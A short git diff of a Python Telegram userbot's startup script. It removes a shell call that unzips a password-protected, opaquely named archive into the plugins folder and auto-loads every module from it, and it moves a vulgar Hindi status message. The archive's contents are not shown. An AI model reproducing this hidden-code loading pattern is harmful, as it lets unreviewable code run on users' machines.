@@ -44,23 +44,11 @@ else:
     else:
         bot.start()
 
-ItzSjDude.connect()
 ItzSjDude.loop.run_until_complete(start())
 ItzSjDude.loop.run_until_complete(stop())
 
-os.system("cd ./userbot/plugins && unzip -P q8ly,[,[R,Z%FMP XF4kfCveir.zip")
-
-import glob
-path = 'userbot/plugins/*.py'
-files = glob.glob(path)
-for name in files:
-    with open(name) as f:
-        path1 = Path(f.name)
-        shortname = path1.stem
-        load_module(shortname.replace(".py", ""))
-
-print("Chal Gya hu bsdk Ab jaa k saved msgs me .help ya .alive type krke confirm kr le")
 import userbot._core
+print("Chal Gya hu bsdk Ab jaa k saved msgs me .help ya .alive type krke confirm kr le")
 
 if len(argv) not in (1, 3, 4):
     bot.disconnect()
